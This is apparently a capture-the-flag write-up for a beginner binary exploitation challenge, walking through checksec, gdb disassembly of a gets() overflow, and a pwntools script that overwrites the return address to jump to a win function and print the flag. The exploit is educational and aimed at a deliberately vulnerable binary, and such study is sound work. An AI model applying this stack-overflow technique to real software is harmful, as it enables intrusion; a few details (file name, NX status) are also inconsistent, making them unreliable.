## CTF Challenge Writeup: Easy Peasy - Binary Exploitation

- **Challenge Name:** Easy Peasy  
- **Category:** Binary Exploitation  
- **Points:** 100  
- **Author:** BitR13x
- **Difficulty:** Beginner

**Description:**
Welcome to "Easy Peasy," a beginner-level binary exploitation challenge! Your task is to exploit a vulnerable binary and gain control of the eip register. The flag is located in a file named "flag.txt" on the system. Read the contents of "flag.txt" and submit it to the CTF platform to claim your points.

**Challenge Binary:** [ezpz](https://traboda-arena-87.s3.amazonaws.com/files/attachments/ezpz_d016f92c-e33f-4ea0-9105-eb810bfe783d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA6GUFVMV6HO3NYL6Z%2F20230807%2Fap-south-1%2Fs3%2Faws4_request&X-Amz-Date=20230807T023644Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=268122cbf4717f164e612e2846a87214dabf0890d59bdac6977cf0fc8475c8da)

**Hints:**

1. Check for buffer overflows or other memory-related vulnerabilities.
2. Use a debugger to analyze the behavior of the binary during execution.
3. Research about Return-Oriented Programming (ROP) and how it can be applied to bypass certain security mechanisms.

**Requirements:**

- Linux operating system (recommended: Ubuntu)
- Basic knowledge of assembly language and binary exploitation techniques.

**Writeup:**

**Step 1: Understanding the Binary:**
The first step is to download the challenge binary and understand its functionality. We can use tools like `file` and `checksec` to get some initial information about the binary:

```bash
$ file pzpz
easy_peasy: ELF 64-bit LSB executable, x86-64, ...

$ checksec ezpz
[*] '/home/kali/workspace/DeconstruCT.F-writeups/EasyPeasy/ezpz'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

The output indicates that it is a 64-bit ELF binary without full security measures (Partial RELRO and NX enabled) except canary, but with further analyzation with cutter showed that there is no worries about canary.

**Step 2: Initial Analysis:**
Run the binary to see its behavior:

```bash
$ ./ezpz
Please enter the super secret password to display the flag:
AAAAAA
Invalid password, try again
```

It seems that the binary is a simple program that asks for a password. By further investigation in cutter or ghidra, we can see there is also `win` function which should return flag. And also good to keep in mind that the addresses remain static.

**Step 3: Identifying Vulnerability:**
Next, we need to identify vulnerabilities that can be exploited to gain control of the program. Common vulnerabilities include buffer overflows, format string vulnerabilities, and unsafe input handling.

Since it's a beginner-level challenge, let's try entering a long input and see if it causes any unexpected behavior:

```bash
$ ./ezpz
Please enter the super secret password to display the flag:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./ezpz
```

The program accepts the input and report segmentation fault error, suggesting there might be a buffer overflow vulnerability and we are overwriting the execution. When taking closer look in cutter or ghidra, we can see that buffer is 32byte long also good to keep in mind.

**Step 4: Exploiting the Vulnerability:**
Let's use a debugger like GDB to further analyze the program and identify the exact location of the vulnerability.

```bash
$ gdb ./ezpz
(gdb)➤ disassemble vuln
Dump of assembler code for function vuln:
   0x0000000000401870 <+0>:	endbr64
   0x0000000000401874 <+4>:	push   rbp
   0x0000000000401875 <+5>:	mov    rbp,rsp
   0x0000000000401878 <+8>:	sub    rsp,0x20
   0x000000000040187c <+12>:	lea    rax,[rbp-0x20]
   0x0000000000401880 <+16>:	mov    rdi,rax
   0x0000000000401883 <+19>:	mov    eax,0x0
   0x0000000000401888 <+24>:	call   0x4124a0 <gets>
   0x000000000040188d <+29>:	nop
   0x000000000040188e <+30>:	leave
   0x000000000040188f <+31>:	ret

```

By analyzing the main function's assembly, we can identify the vulnerable `gets()` function and the potential exploitability.

**Step 5: Crafting the Exploit:**
With the vulnerability identified, we can now craft our exploit. Since this is a beginner-level challenge, it might not require advanced techniques like ROP.

To craft the payload I used pwntools and python:

```py
from pwn import *
from pwn import p64

ip = "ip_address"
port = "port"

#p = remote(str(ip),int(port)) # uncomment to connect on remote ip
p = process("./ezpz")
#gdb.attach(p, gdbscript='continue') # option to attach gdb

junk = b"A"*40

#? The JMP ESP instruction "0x625011af"
#? eip = "\xaf\x11\x50\x62"

# address of win function
eip = p64(0x004017ea) # translation into little-endian and 64bit address

#nops = "\x90" * 16
payload = junk + eip # + nops# + shellcode

p.recvline() # waiting on recv
p.sendline(payload) # send
p.interactive() # interactive shell
```

So straight forward, importing pwntools and creating process as `p`, now we know that buffer is 32byte long + 8 for a padding to move on stack. The stack should pop the address and keep executing this address instead.

When you are not sure how long is `buffer` and about the padding fuzzing is most of the time a good way.

Now we need an address of `win` function to know where to redirect execution, just use gdb.

```bash
(gdb)➤ disassemble win
Dump of assembler code for function win:
   0x00000000004017e5 <+0>:	endbr64
   0x00000000004017e9 <+4>:	push   rbp
   0x00000000004017ea <+5>:	mov    rbp,rsp
   0x00000000004017ed <+8>:	sub    rsp,0x50
   0x00000000004017f1 <+12>:	lea    rax,[rip+0x96810]        # 0x498008
   0x00000000004017f8 <+19>:	mov    rsi,rax
   0x00000000004017fb <+22>:	lea    rax,[rip+0x96808]        # 0x49800a
   0x0000000000401802 <+29>:	mov    rdi,rax
   0x0000000000401805 <+32>:	call   0x4121f0 <fopen64>
   0x000000000040180a <+37>:	mov    QWORD PTR [rbp-0x8],rax
...
```

We can't take the first two address so the stack is not overflowed and don't segfault before printing the flag.

**Step 6: Retrieve the Flag:**
Once the exploit is crafted, run the binary with the exploit payload to gain `flag.txt`.

```bash
$ ./bufferoverflow.py
[Flag will be printed here]
```

**Step 7: Writeup Submission:**
Document the steps you followed to exploit the binary, including the vulnerable function, the payload used, and how you gained control over the program.

Happy Hacking!
